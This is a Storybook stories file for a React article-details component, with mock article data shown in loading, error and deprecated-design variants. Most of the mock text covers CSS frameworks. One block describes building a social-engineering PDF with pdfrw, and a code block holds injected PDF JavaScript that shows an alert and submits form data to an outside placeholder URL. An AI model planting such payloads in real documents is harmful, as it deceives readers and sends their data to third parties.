import React from 'react';
import { ComponentStory, ComponentMeta } from '@storybook/react';
import { StoreDecorator } from '@/shared/config/storybook/StoreDecorator';
import { ArticleType, ArticleBlockType } from '../../model/consts/consts';
import { Article } from '../../model/types/article';
import { ArticleDetails } from './ArticleDetails';
import { NewDesignDecorator } from '@/shared/config/storybook/NewDesignDecorator';

export default {
  title: 'entities/Article/ArticleDetails',
  component: ArticleDetails,
  argTypes: {
    backgroundColor: { control: 'color' },
  },
} as ComponentMeta<typeof ArticleDetails>;

const Template: ComponentStory<typeof ArticleDetails> = (args) => <ArticleDetails {...args} />;

const article: Article = {
  id: '1',
  title: 'Javascript news',
  subtitle: 'Что нового в JS в 2023 году?',
  img: 'https://www.androidfreeware.net/software_images/jsnews-javascript-news.thumb.png',
  view: 1022,
  user: {
    id: '1',
    username: 'Ivan',
  },
  createdAt: '10.03.2023',
  type: [ArticleType.IT],
  blocks: [
    {
      id: '1',
      type: ArticleBlockType.TEXT,
      title: 'Фреймворки CSS',
      paragraphs: [
        'Фреймворки CSS представляют собой код CSS, обеспечивающий набор правил, руководств и готовых элементов, которые можно использовать для эффективного создания веб-страниц. Обычно они включают в себя заранее разработанные компоненты UI вроде кнопок, форм и сеток, а также правила стилизации для типичных HTML-элементов.',
        'Это лишь некоторые из популярных фреймворков для фронтенд-разработки. При выборе одного из них важно учитывать такие факторы, как требования конкретного проекта, возможности и гибкость самого фреймворка, а также простоту использования и доступность кастомизации.',
      ],
    },
    {
      id: '3',
      type: ArticleBlockType.TEXT,
      title: 'Сборка файла для социальной инженерии',
      paragraphs: [
        'Для внедрения кода и разбора файлов я использовала библиотеку для Python pdfrw. Для экспериментов будем использовать документ file-sample_150kB.pdf. Во всех последующих примерах фигурирует следующий скрипт',
      ],
    },
    {
      id: '4',
      type: ArticleBlockType.CODE,
      code: 'app.alert("Click here");\n\nthis.submitForm(\'https://my.url/\');',
    },
    {
      id: '5',
      type: ArticleBlockType.IMAGE,
      src: 'https://hsto.org/r/w1560/getpro/habr/upload_files/286/d04/6b3/286d046b3db760208e31363704a90735.png',
      title: 'Рисунок 15. Alert в Adobe Reader',
    },
  ],
};

export const Primary = Template.bind({});
Primary.args = {};
Primary.decorators = [
  NewDesignDecorator,
  StoreDecorator({
    articleDetails: {
      data: article,
    },
  }),
];

export const Loading = Template.bind({});
Loading.args = {};
Loading.decorators = [
  NewDesignDecorator,
  StoreDecorator({
    articleDetails: {
      isLoading: true,
    },
  }),
];

export const Error = Template.bind({});
Error.args = {};
Error.decorators = [
  NewDesignDecorator,
  StoreDecorator({
    articleDetails: {
      error: 'error',
    },
  }),
];

export const PrimaryDeprecated = Template.bind({});
PrimaryDeprecated.args = {};
PrimaryDeprecated.decorators = [
  StoreDecorator({
    articleDetails: {
      data: article,
    },
  }),
];

export const LoadingDeprecated = Template.bind({});
LoadingDeprecated.args = {};
LoadingDeprecated.decorators = [
  StoreDecorator({
    articleDetails: {
      isLoading: true,
    },
  }),
];

export const ErrorDeprecated = Template.bind({});
ErrorDeprecated.args = {};
ErrorDeprecated.decorators = [
  StoreDecorator({
    articleDetails: {
      error: 'error',
    },
  }),
];
